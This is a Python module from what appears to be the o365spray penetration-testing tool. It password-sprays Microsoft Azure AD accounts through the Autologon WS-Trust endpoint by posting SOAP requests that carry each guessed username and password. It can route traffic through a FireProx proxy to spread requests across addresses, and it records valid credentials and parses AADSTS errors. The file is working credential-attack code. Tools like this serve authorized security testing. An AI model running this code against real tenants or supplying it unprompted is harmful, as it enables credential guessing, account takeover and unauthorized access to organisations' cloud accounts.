#!/usr/bin/env python3

import re
import time
import logging
from uuid import uuid4
from datetime import (
    datetime,
    timedelta,
)
from o365spray.core.utils import (
    Defaults,
    Helper,
    text_colors,
)
from o365spray.core.handlers.sprayer.modules.base import SprayerBase


class SprayModule_autologon(SprayerBase):
    """Autologon Sprayer module class"""

    def __init__(self, *args, **kwargs):
        """Initialize the parent base class"""
        super(SprayModule_autologon, self).__init__(*args, **kwargs)

    def _spray(self, domain: str, user: str, password: str):
        """Spray users via Microsoft Azure's Autologon endpoint

        Arguments:
            domain: domain to spray
            user: username for authentication
            password: password for authentication

        Raises:
            Exception: generic handler so we can successfully fail without
              crashing the run
        """
        try:
            # Build email if not already built
            email = self.HELPER.check_email(user, domain)

            # Write the tested user
            tested = f"{email}:{password}"
            if self.writer:
                self.tested_writer.write(tested)

            time.sleep(0.250)

            # Grab default headers
            headers = Defaults.HTTP_HEADERS

            # Handle FireProx API URL
            if self.proxy_url:
                proxy_url = self.proxy_url.rstrip("/")
                url = f"{proxy_url}/{domain}/winauth/trust/2005/usernamemixed?client-request-id={uuid4()}"

                # Update headers
                headers = Helper.fireprox_headers(headers)

            else:
                url = f"https://autologon.microsoftazuread-sso.com/{domain}/winauth/trust/2005/usernamemixed?client-request-id={uuid4()}"

            created = datetime.utcnow()
            expires = created + timedelta(minutes=10)
            created = created.strftime("%Y-%m-%dT%H:%M:%S.001Z")
            expires = expires.strftime("%Y-%m-%dT%H:%M:%S.001Z")

            data = f"""
<?xml version='1.0' encoding='UTF-8'?>
<s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope' xmlns:wsse='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd' xmlns:saml='urn:oasis:names:tc:SAML:1.0:assertion' xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy' xmlns:wsu='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd' xmlns:wsa='http://www.w3.org/2005/08/addressing' xmlns:wssc='http://schemas.xmlsoap.org/ws/2005/02/sc' xmlns:wst='http://schemas.xmlsoap.org/ws/2005/02/trust' xmlns:ic='http://schemas.xmlsoap.org/ws/2005/05/identity'>
    <s:Header>
        <wsa:Action s:mustUnderstand='1'>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
        <wsa:To s:mustUnderstand='1'>{url}</wsa:To>
        <wsa:MessageID>urn:uuid:{uuid4()}</wsa:MessageID>
        <wsse:Security s:mustUnderstand="1">
            <wsu:Timestamp wsu:Id="_0">
                <wsu:Created>{created}</wsu:Created>
                <wsu:Expires>{expires}</wsu:Expires>
            </wsu:Timestamp>
            <wsse:UsernameToken wsu:Id="uuid-{uuid4()}">
                <wsse:Username>{email}</wsse:Username>
                <wsse:Password>{password}</wsse:Password>
            </wsse:UsernameToken>
        </wsse:Security>
    </s:Header>
    <s:Body>
        <wst:RequestSecurityToken Id='RST0'>
            <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
                <wsp:AppliesTo>
                    <wsa:EndpointReference>
                        <wsa:Address>urn:federation:MicrosoftOnline</wsa:Address>
                    </wsa:EndpointReference>
                </wsp:AppliesTo>
                <wst:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</wst:KeyType>
        </wst:RequestSecurityToken>
    </s:Body>
</s:Envelope>
"""

            response = self._send_request(
                "post",
                url,
                data=data.strip(),
                headers=headers,
                proxies=self.proxies,
                timeout=self.timeout,
                sleep=self.sleep,
                jitter=self.jitter,
            )
            status = response.status_code

            if status == 200:
                if self.writer:
                    self.valid_writer.write(tested)
                self.VALID_CREDENTIALS.append(tested)
                logging.info(
                    f"[{text_colors.OKGREEN}VALID{text_colors.ENDC}] {email}:{password}"
                )
                # Remove valid user from being sprayed again
                self.userlist.remove(user)

            elif status == 401:
                body = response.text
                error = re.search(">(AADSTS.+?)<", body)
                if error:
                    error = error.group(1)
                self._check_aadsts(
                    user,
                    email,
                    password,
                    error,
                )

            else:
                print(
                    f"[{text_colors.FAIL}INVALID{text_colors.ENDC}] "
                    f"{email}:{password}{' '*10}",
                    end="\r",
                )

        except Exception as e:
            logging.debug(e)
            pass
